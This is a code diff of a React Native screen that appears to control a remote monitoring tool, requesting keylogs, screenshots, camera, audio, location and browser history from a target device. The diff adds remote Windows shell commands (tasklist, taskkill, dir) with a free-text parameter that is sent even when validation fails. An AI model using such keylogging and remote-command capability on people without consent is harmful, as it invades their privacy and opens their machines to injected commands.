@@ -1,7 +1,7 @@
 import { React, useState, useEffect } from "react";
 import { Pressable, Text, Modal, Image, ScrollView } from "react-native";
 import { SafeAreaView } from "react-native-safe-area-context";
-import { View, FlatList, StyleSheet } from "react-native-web";
+import { View, FlatList, TextInput, StyleSheet } from "react-native-web";
 import { FontAwesome, MaterialIcons } from "@expo/vector-icons";
 import { Picker } from "@react-native-picker/picker";
 import base64 from "react-native-base64";
@@ -14,19 +14,24 @@ import {
   deleteAllData,
 } from "../components/FetchRequest";
 import { GoBackButton } from "../components/Buttons";
+import { checkCmdParam } from "../components/Errors";
 import global from "../config/global";
 import colors from "../config/colors";
 import sizes from "../config/sizes";
 
-// Screenshot, Keylog, Camera, Audio, Location and History requests page
+// Screenshot, Keylog, Camera, Audio, Lockdown, Location and History requests page
 
-const ImmediatelyRequest = ({ route, navigation }) => {
+const Requests = ({ route, navigation }) => {
   const [data, setData] = useState([]);
   const [specificData, setSpecificData] = useState([]);
   const [browser, setBrowser] = useState("");
   const [refresh, setRefresh] = useState(true);
   const [modalVisible, setModalVisible] = useState(false);
   const [historyModalVisible, setHistoryModalVisible] = useState(false);
+  const [cmdModalVisible, setCmdModalVisible] = useState(false);
+  const [cmdType, setCmpType] = useState("");
+  const [cmdParam, setCmdParam] = useState("");
+  const [cmdParamError, setCmdParamError] = useState("");
   const { uid } = route.params;
   const { name } = route.params;
   const { type } = route.params;
@@ -88,8 +93,8 @@ const ImmediatelyRequest = ({ route, navigation }) => {
         let decodedNetLog = base64.decode(specificData.toString());
         return (
           <ScrollView>
-            <Text>
-              {(decodedNetLog)
+            <Text style={styles.TextInfo}>
+              {decodedNetLog
                 .replace(/Subject/g, "")
                 .replace(/: CN=/g, "")
                 .replace(/O=/g, "")
@@ -98,8 +103,7 @@ const ImmediatelyRequest = ({ route, navigation }) => {
                 .replace(/S=/g, "")
                 .replace(/C=/g, "")
                 .replace(/\"/g, "")
-                .replace(/,/g, "")
-              }
+                .replace(/,/g, "")}
             </Text>
           </ScrollView>
         );
@@ -107,7 +111,7 @@ const ImmediatelyRequest = ({ route, navigation }) => {
         let decodedData = base64.decode(specificData.toString());
         return (
           <ScrollView>
-            <Text>{removeNonAscii(decodedData)}</Text>
+            <Text style={styles.TextInfo}>{removeNonAscii(decodedData).replace(/"/g, "")}</Text>
           </ScrollView>
         );
       }
@@ -122,6 +126,7 @@ const ImmediatelyRequest = ({ route, navigation }) => {
           selectedValue={browser}
           onValueChange={(itemValue, itemIndex) => setBrowser(itemValue)}
         >
+          <Picker.Item label="Choose an option" value="" />
           <Picker.Item label="Chrome" value="Chrome" />
           <Picker.Item label="Opera" value="Opera" />
           <Picker.Item label="Brave" value="Brave" />
@@ -129,6 +134,57 @@ const ImmediatelyRequest = ({ route, navigation }) => {
         </Picker>
       </View>
     );
+  };
+
+  const setCmdComponent = () => {
+    return (
+      <View>
+        <View>
+          <Picker
+            style={global.TextInput}
+            selectedValue={cmdType}
+            onValueChange={(itemValue, itemIndex) => setCmpType(itemValue)}
+          >
+            <Picker.Item label="Choose an option" value="" />
+            <Picker.Item label="Show all processes" value="tasklist" />
+            <Picker.Item label="Close a program" value="taskkill /IM" />
+            <Picker.Item label="Show hidden files" value="dir /AH" />
+            <Picker.Item label="Show folders and files" value="dir /ON" />
+          </Picker>
+        </View>
+        <View>{getAdditionalParam(cmdType)}</View>
+        <Text style={global.ErrorMsg}>{cmdParamError}</Text>
+      </View>
+    );
+  };
+
+  const getAdditionalParam = (cmdType) => {
+    switch (cmdType) {
+      case "taskkill /IM":
+      case "dir /AH":
+      case "dir /ON":
+        return (
+          <TextInput
+            style={global.TextInputInModal}
+            placeholder="Additional Param"
+            placeholderTextColor={colors.primary}
+            onChangeText={(cmdParam) => setCmdParam(cmdParam)}
+          />
+        );
+      default:
+        break;
+    }
+  };
+
+  const defineCmdAttributes = () => {
+    let dataAttr;
+    dataAttr = {
+      REQUEST_TYPE: type,
+      COMMAND_TYPE: cmdType,
+      COMMAND_PARAMETER: cmdParam,
+    };
+    checkCmdParam(cmdParam, setCmdParamError);
+    addRequest(uid, dataAttr);
   };
 
   const checkRequestButton = () => {
@@ -142,6 +198,15 @@ const ImmediatelyRequest = ({ route, navigation }) => {
             style={styles.AddRequestButton}
           >
             <Text style={global.ButtonText}>Download browser history</Text>
+          </Pressable>
+        );
+      case "COMMAND":
+        return (
+          <Pressable
+            onPress={() => setCmdModalVisible(true)}
+            style={styles.AddRequestButton}
+          >
+            <Text style={global.ButtonText}>Add Command request</Text>
           </Pressable>
         );
       default:
@@ -298,6 +363,37 @@ const ImmediatelyRequest = ({ route, navigation }) => {
               </View>
             </View>
           </Modal>
+          <Modal /* Modal for COMMAND */
+            style={global.Modal}
+            animationType="fade"
+            transparent={true}
+            visible={cmdModalVisible}
+            onRequestClose={() => {
+              setCmdModalVisible(!cmdModalVisible);
+            }}
+          >
+            <View style={global.ModalView}>
+              <View style={global.ModalConfigContainer}>
+                <View style={global.TopModalView}>{setCmdComponent()}</View>
+                <View style={global.BottomModalView}>
+                  <Pressable
+                    onPress={() => {
+                      defineCmdAttributes();
+                    }}
+                    style={global.CloseButton}
+                  >
+                    <Text style={global.ButtonText}>Send</Text>
+                  </Pressable>
+                  <Pressable
+                    style={global.CloseButton}
+                    onPress={() => setCmdModalVisible(!cmdModalVisible)}
+                  >
+                    <Text style={global.ButtonText}>Close</Text>
+                  </Pressable>
+                </View>
+              </View>
+            </View>
+          </Modal>
           {checkRequestButton()}
         </View>
       </View>
@@ -321,6 +417,13 @@ const styles = StyleSheet.create({
     margin: 5,
     paddingLeft: 10,
   },
+  TextInfo: {
+    fontSize: 15,
+    letterSpacing: 0.5,
+    fontWeight: "bold",
+    padding: 1,
+    paddingTop: 10,
+  },
 });
 
-export default ImmediatelyRequest;
+export default Requests;
